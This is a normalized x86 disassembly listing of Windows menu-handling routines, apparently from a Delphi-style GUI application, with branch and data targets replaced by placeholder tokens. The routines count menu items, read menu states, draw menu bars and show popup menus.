shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_44aa70
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_44b00c
mov eax ebx
call sub_40835c
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_44ab10
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_44aa70
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_4041dc
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_40442c
lea edx [ ebp - 0x200 ]
call sub_408420
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_44aba4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44b0b4
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44b0b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_44b0b4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_44ac20
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_44ab10
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_44aba4
mov eax ebx
call sub_44b0d8
jmp r-xdata
sub_44ac88
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44acd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_444f00
mov eax ebx
call sub_44a4e4
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_444f44
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_4192b0
sub_44ad0c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4194fc
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_44acd0
sub_44ad50
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44a594
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_44a594
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_44e044
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_44adac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44a594
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44a594
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_449140
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_449150
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404154
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404154
mov eax [ ebp - 0xc ]
pop edx
call sub_407ba4
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_44bbf8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ae88
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f90
retn
sub_44ae94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44ad50
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44adac
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_44b00c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_44a718
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_44a594
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_44a594
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408400
mov eax [ ebp + 0x10 ]
call sub_408344
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44b0d8
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_434238
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44b0b4
mov [ ebx + 0x41 ] 0x1
sub_44b100
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44b0b4
mov [ ebx + 0x41 ] 0x1
sub_44b18c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44ac88
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_44ab10
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_44b21c
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_44b258
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44b282
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44b2a4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b7de
lea eax [ ebp - 0x30 ]
call sub_403f6c
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413840
mov edx [ esi + 0x4 ]
call sub_44a650
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_457654
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413840
mov dx [ esi + 0x4 ]
call sub_44a634
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41d23c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d0dc
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44ba7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b5f4
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d23c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_44ae94
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_44a594
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413840
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44a594
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb54
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41d23c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d0dc
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b712
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d23c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_4344bc
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_457654
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413840
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44a594
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413840
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_44a594
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413840
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413840
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_44a594
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413840
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413840
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_44a5c4
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413840
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_413840
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_44a5c4
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_4572f8
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_457360
jmp r-xdata
sub_44b72f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_44b7e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4136e4
pop esi
pop ebx
retn
push ebx
push sub_44b258
call sub_41a340
mov [ ebx + 0x10 ] eax
sub_44b82c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44a3ac
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_44b7e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_44b8a0
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44b810
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44a448
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_44b8f8
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_446744
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_44b0b4
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44b0b4
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_44b940
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_446744
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_455ea4
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403430
mov edx eax
jmp r-xdata
sub_44b98c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_4123e4
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_44b8f8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_449d00
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44a1fc
mov eax [ ebx + 0x34 ]
call sub_4475a4
mov eax ebx
call sub_44aba4
mov eax ebx
call sub_44b940
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_4476d4
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44ba40
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413840
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413840
cmp ebp [ eax ]
jne r-xdata
sub_44ba7c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41ca04
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41c238
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41ca04
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41c238
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403430
mov edx [ r-xdata ]
call sub_4033c0
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41ca04
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41c238
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_44bb64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403fc0
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_40422c
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4044cc
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_40422c
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4044cc
jmp r-xdata
sub_44bbf8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403f6c
mov ebx 0x1
mov eax esi
call sub_40422c
mov edi eax
cmp edi ebx
